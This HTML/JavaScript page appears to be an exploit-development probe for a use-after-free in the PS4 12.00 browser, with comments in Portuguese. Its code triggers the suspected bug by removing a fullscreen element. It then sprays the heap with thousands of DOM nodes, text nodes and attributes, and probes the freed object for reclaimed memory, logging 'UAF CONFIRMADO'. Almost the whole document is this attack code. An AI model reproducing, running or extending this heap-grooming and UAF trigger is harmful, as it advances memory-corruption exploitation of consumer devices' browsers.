<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 12.00 - UAF Aggressive Reclaim (REAL TEST)</title>
</head>
<body style="background:#111;color:#0f0;font-family:monospace;">

<h2>PS4 12.00 - UAF Aggressive Reclaim (Real Validation)</h2>
<button onclick="runTest()">Run Test</button>

<script>

// ==========================
// 🔒 LOG SEGURO (ALERT)
// ==========================
let logBuffer = [];

function log(msg) {
    try { console.log(msg); } catch(e){}
    logBuffer.push(msg);
}

// ==========================
// HEAP SETUP (INALTERADO)
// ==========================
function setupHeap() {
    let controllers = [];

    for(let i = 0; i < 5000; i++) {
        let arr = new Float64Array(8);
        arr[0] = i;
        controllers.push(arr);
    }

    return controllers;
}

// ==========================
// FULLSCREEN (INALTERADO)
// ==========================
function setupFullscreen() {
    let fsTarget = document.createElement("div");

    fsTarget.innerHTML = "<h1>FULLSCREEN ACTIVE<br>Press OPTIONS</h1>";

    fsTarget.style.position = "absolute";
    fsTarget.style.top = "0";
    fsTarget.style.left = "0";
    fsTarget.style.width = "100%";
    fsTarget.style.height = "100%";
    fsTarget.style.background = "black";

    document.body.appendChild(fsTarget);

    fsTarget.webkitRequestFullscreen?.();

    return fsTarget;
}

// ==========================
// 💣 AGGRESSIVE RECLAIM REAL
// ==========================
function aggressiveReclaim() {
    log("[*] Aggressive reclaim iniciado");

    let bucket = [];

    // Fase 1 — churn pesado
    for (let i = 0; i < 8000; i++) {
        let el = document.createElement("div");
        document.body.appendChild(el);
        el.remove();
    }

    // 🔥 Fase 2 — spray CONTROL (mesmo layout)
    for (let i = 0; i < 12000; i++) {
        let el = document.createElement("div");

        el.innerHTML = "CONTROL_" + i;
        el.style.position = "absolute";
        el.style.width = "100%";
        el.style.height = "100%";

        document.body.appendChild(el);
        bucket.push(el);
    }

    // 🔥 Fase 3 — TextNode spray
    for (let i = 0; i < 8000; i++) {
        let txt = document.createTextNode("TXT_" + i);
        document.body.appendChild(txt);
        bucket.push(txt);
    }

    // 🔥 Fase 4 — Attribute spray
    for (let i = 0; i < 8000; i++) {
        let el = document.createElement("div");
        el.setAttribute("data-x", "ATTR_" + i);
        document.body.appendChild(el);
        bucket.push(el);
    }

    // 🔥 Fase 5 — churn final
    for (let i = 0; i < 5000; i++) {
        let el = document.createElement("span");
        document.body.appendChild(el);
        el.remove();
    }

    log("[*] Aggressive reclaim finalizado: " + bucket.length);
    return bucket;
}

// ==========================
// 🔬 DETECÇÃO REAL DE UAF
// ==========================
function checkUAF(fsTarget) {

    log("---- UAF CHECK ----");

    try {
        let html = fsTarget.innerHTML;
        log("[CHECK] innerHTML = " + html);

        // 🎯 DETECÇÃO REAL
        if (html && html.includes("CONTROL_")) {
            log("[!!!] UAF CONFIRMADO - REUSE DETECTADO");
        }

        if (html === "X" || html.length === 1) {
            log("[!!!] POSSIVEL CORRUPÇÃO DE STRING");
        }

    } catch(e) {
        log("[UAF] innerHTML crash");
    }

    try {
        let parent = fsTarget.parentNode;
        log("[CHECK] parent = " + parent);
    } catch(e) {
        log("[UAF] parent crash");
    }

    try {
        let rect = fsTarget.getBoundingClientRect();
        log("[CHECK] layout = " + rect.width);
    } catch(e) {
        log("[!!!] UAF CRASH EM LAYOUT");
    }

    try {
        fsTarget.innerHTML = "A";
        log("[CHECK] write OK");
    } catch(e) {
        log("[!!!] WRITE CORROMPIDO");
    }
}

// ==========================
// TRIGGER (INALTERADO)
// ==========================
function trigger(fsTarget) {

    log("[*] Trigger");

    try {
        fsTarget.remove();

        if (document.webkitIsFullScreen || document.fullscreenElement) {
            document.webkitExitFullscreen?.();
        }

    } catch(e) {
        log("[ERRO]");
    }

    // 🔥 janela crítica REAL
    setTimeout(() => aggressiveReclaim(), 0);
    setTimeout(() => aggressiveReclaim(), 50);
    setTimeout(() => aggressiveReclaim(), 100);

    // 🔬 múltiplas probes
    setTimeout(() => checkUAF(fsTarget), 20);
    setTimeout(() => checkUAF(fsTarget), 80);
    setTimeout(() => checkUAF(fsTarget), 160);
    setTimeout(() => checkUAF(fsTarget), 250);

    // 📦 dump via alert (SEGURO)
    setTimeout(() => {
        alert(logBuffer.join("\n"));
    }, 400);

    setTimeout(() => location.reload(), 500);
}

// ==========================
// MAIN (INALTERADO)
// ==========================
function runTest() {

    log("[*] Iniciando teste");

    let controllers = setupHeap();
    let fsTarget = setupFullscreen();

    window.onblur = function() {
        log("[*] onblur");

        setTimeout(() => trigger(fsTarget), 3000);
    };
}

</script>

</body>
</html>
